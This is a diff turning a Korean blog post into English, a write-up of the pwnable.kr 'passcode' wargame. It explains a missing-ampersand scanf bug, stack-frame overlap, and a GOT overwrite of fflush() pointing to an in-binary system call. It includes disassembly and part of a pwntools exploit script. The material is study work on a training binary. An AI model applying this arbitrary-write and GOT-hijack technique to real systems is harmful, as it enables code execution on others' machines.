@@ -1,26 +1,26 @@
 ---
 title: "[pwnable.kr] passcode"
 published: 2026-09-25
-description: 워게임 풀기
+description: Solving a wargame challenge
 category: CTF
 tags: [pwnable.kr, study]
 draft: false
 ---
 
-# 스택 프레임
-사실 이 안에서 약간 다른 부분을 알아야 하는 느낌인 것 같다.  
-그래도 스택 프레임의 이해도와 관련 있다고 생각한다. `스택 프레임`을 굵게 표시한 것도 그런 이유다.  
+# Stack Frame
+Honestly, it feels like a slightly different concept is at work here.  
+Still, I think it comes down to understanding stack frames. That's why I emphasized `stack frame`, too.  
 
-# 풀이
-## 핵심
-문제는 간단하다.  
-`프레임 위치`, `덮어쓸 값`, `덮어쓸 주소`, `코드 조각 재사용`.  
-이 네 가지가 중요 키워드였던 것 같다.  
+# Solution
+## Key Points
+The problem is simple.  
+`stack-frame layout`, `value to write`, `target address`, and `code reuse`.  
+Those four ideas seemed to matter most.  
 
-`Radare2`를 써본 적이 거의 없어서, 이젠 이 디버거를 주력으로 사용하려 한다.  
-가장 나은 것 같다. 전엔 어려워서 안 썼다.  
+I've barely used `Radare2`, but I'm going to make it my main debugger from now on.  
+It looks like the best option. I stayed away from it before because it felt difficult.  
 
-보호 기법 및 간단한 정보는 다음과 같다:  
+The protections and basic information are as follows:  
 ```bash
 [*] '***/passcode'
     Arch:       i386-32-little
@@ -31,8 +31,8 @@ draft: false
     Stripped:   No
 ```
 
-## 코드 분석
-코드를 둘러보자  
+## Code Analysis
+Let's look through the code.  
 
 ### 1. `main()`
 ```c
@@ -44,8 +44,8 @@ int main(){
 }
 ```
 
-`main`에서 호출되는 함수는 두 가지이다. 모두 `main()`에서 호출된다는 점이 중요하다.  
-어셈블리로 해당 부분만 보면 다음과 같다:  
+`main()` calls two functions. What matters is that they are called one after the other from the same caller.  
+Looking at just those calls in assembly:  
 
 ```asm
 ...
@@ -55,7 +55,7 @@ int main(){
 ...
 ```
 
-딱히 중간에 `esp`가 변하지도 않는다.
+There is no meaningful change to `esp` between them, either.
 
 ### 2. `welcome()`
 ```c
@@ -66,7 +66,7 @@ void welcome(){
     printf("Welcome %s!\n", name);
 }
 ```
-그냥 100글자 입력이다. `%s`라 `raw bytes`들을 넣을 수도 있다. 그냥 뭐 그렇단 얘기,,  
+It simply reads up to 100 characters. Since it uses `%s`, I can feed it `raw bytes` too. That's all I mean,,  
 
 ### 3. `login()`
 ```c
@@ -94,19 +94,19 @@ void login(){
     }
 }
 ```
-이번 코드도 핵심만 보여주면 된다. 그러나 함수의 전체 코드는 당황을 느껴보게 하기 위해 넣었다.  
-간단하게, &(앰퍼샌드)를 붙이지 않은 점, 그리고 아무 일도 없었다는 듯 `if`문으로 그럴 듯한 분기문이 적혀 있다는 점..  
-당황스러웠다. 공포감을 느꼈다. 
-# 이게 뭐지? 
-의도하지 않고서야 이런 이상함을 낼 수는 없다고 느꼈고, 오랜만에 재밌는 생각들을 했다.  
+Only a few lines matter here, but I included the whole function so you can share my initial confusion.  
+Simply put, both `scanf` calls are missing the `&` (ampersand), yet the function carries on as if nothing is wrong and follows them with a perfectly plausible `if` branch..  
+I was confused. It was honestly a little terrifying.
+# What Is This?
+It was too strange to be accidental, and for the first time in a while, it got me thinking in interesting directions.  
 
-## 계획
-먼저, `main()`에서 호출되는 두 함수 `welcome`과 `login`을 보자.  
-두 함수는 호출 될 때 사이에서 `esp` 조정이 발생하지 않았고, 프롤로그도 똑같다. 딱히 조정되는 것이 없다.  
-무엇보다도 이건 상식이다. 함수에서 사용하는 변수의 오프셋(지역 변수의 오프셋)이 모두 같은 `ebp`를 사용한다.  
+## Plan
+First, let's look at the two functions called from `main()`: `welcome` and `login`.  
+There is no `esp` adjustment between the two calls, and their prologues place the stack frames at nearly the same location. Nothing special realigns the stack.  
+More importantly, local variables in both functions are addressed at fixed offsets from `ebp`.  
 
-아래는 간단한 어셈블리다. 잠시 둘러보길 권한다. 중요한 부분은 `오프셋`, 각 `scanf`가 필요로 하는 지역 변수의 오프셋이다.  
-그리고 `system` 호출이 있는데, 여기엔 인자 넣는 부분 조각도 있기 때문에 써먹을 수 있다. `NO PIE`인 상태이니까.  
+Below is the relevant assembly. Take a moment to look it over. The key details are the `offsets`, particularly where each `scanf` expects its local variable.  
+There is also an in-binary `system` call with argument-setup instructions I can reuse. And because the binary is `NO PIE`, its addresses are fixed.  
 ```asm
 0x080490e0]> pdf @ sym.welcome
             ; CALL XREF from main @ 0x8049390
@@ -239,23 +239,22 @@ void login(){
 [0x080490e0]> 
 ```
 
-바이너리 어딘가에 있는 `system` 호출 조각,  
-주소에 직접 쓰는 취약점,  
-그리고 거의 같은 위치에 놓이게 될 프레임을 고려하지 않은 100글자 입력 설계,  
+A `system` call sequence already present in the binary,  
+an arbitrary write,  
+a 100-byte input whose buffer reaches into the next function's stack frame,  
 `No PIE`,  
-그리고 갑자기 입력 사이에 애매하게 등장하는 `fflush()`  
+and an `fflush()` call sitting suspiciously between the two inputs.  
 
-이 다섯 가지 정보를 종합하면 어느 정도 쉽게  
-`fflush()`를 덮어 `system` 호출 조각을 가리키게 하고 `flag` 파일을 읽는 부분만 실행되게 하면 성공이다..  
-라는 점을 알 수 있었다.  
+Putting these five facts together, the path was fairly clear:  
+overwrite `fflush()`'s GOT entry with the address of the `system` call sequence, so the next `fflush()` executes just the part that reads the `flag` file..  
+That was the idea.  
 
-적절히 수행하려면, 나의 경우, `passcode1`이 이미 **어떤 주소**( 여기서는 `fflush()의 GOT` )를 가리키고 있으며, 100글자 이내의 거리에  
-`welcome()`의 `name`과 `login()`의 `passcode1`이 덮을 수 있게 있기만 하면 된다.  
+To make this work, `passcode1` needs to contain **a target address**—here, the GOT entry for `fflush()`—and `welcome()`'s `name` buffer must be close enough to overwrite it within the 100-byte input.  
 
-`name`에서 시작하여 `passcode1`을 덮고, 그 뒤, `passcode1`에 입력을 받는 시점에,  
-`system` 호출 조각을 덮어 `flag` 파일을 읽는 부분만 실행되게 하면 된다. 로 정리가 가능한 것 같다.  
+Starting from `name`, overwrite `passcode1` with that GOT address. Then, when `login()` reads `passcode1`,  
+it writes the address of the `system` call sequence to that target, causing the code that reads the `flag` file to run. I think that sums it up.  
 
-## 익스
+## Exploit
 ```py
 cat ex.py 
 from pwn import *
@@ -280,10 +279,10 @@ p.sendline(str(system).encode())
 
 p.interactive()
 ```
-생각해보니 `slog()`는 어느 드림핵 강의에서 보고 꾸준히 쓰는 것 같다.  
-이상하게 당시 이해가 되고 이 함수를 잊고 싶지 않다는 생각에 기억에 남기기로 했다.  
+Come to think of it, I think I've been using `slog()` ever since I saw it in some Dreamhack lecture.  
+It just clicked, and I made a point of remembering it because I did not want to forget the helper.  
 
-# 번외
+# Aside
 ```bash
 [0x080490e0]> iz
 [Strings]
@@ -319,10 +318,10 @@ nth vaddr      bind   type   lib name
 12  0x080490d0 GLOBAL FUNC       __isoc99_scanf
 ```
 
-그리고 `r2`에선 이렇게 손쉽게 `GOT table`과 `strings` 목록을 확인 가능하다!! 개신기함.  
-ㄷㄷ
+And `r2` makes it this easy to inspect the `GOT table` and `strings` list!! That's ridiculously cool.  
+Whoa.
 
-) 수정본  
-아 맞다 ㅁ맞다
-저거 `%d` 부분엔 `%s`가 `raw bytes`를 해석하는 것과는 다르게 10진 정수로 해석하기 때문에  
-`str(값).encode()` 하여 보내줘야 한다. 그럼 숫자로 인식해서 돌아간다. 이것 때문에 잠시 머리가 멈출 뻔했다.
+) Edit  
+Oh, right.  
+Unlike `%s`, which treats its input as `raw bytes`, `%d` parses a base-10 integer,  
+so I need to send `str(value).encode()`. Then it recognizes the value as a number and works. This almost made my brain freeze for a second.
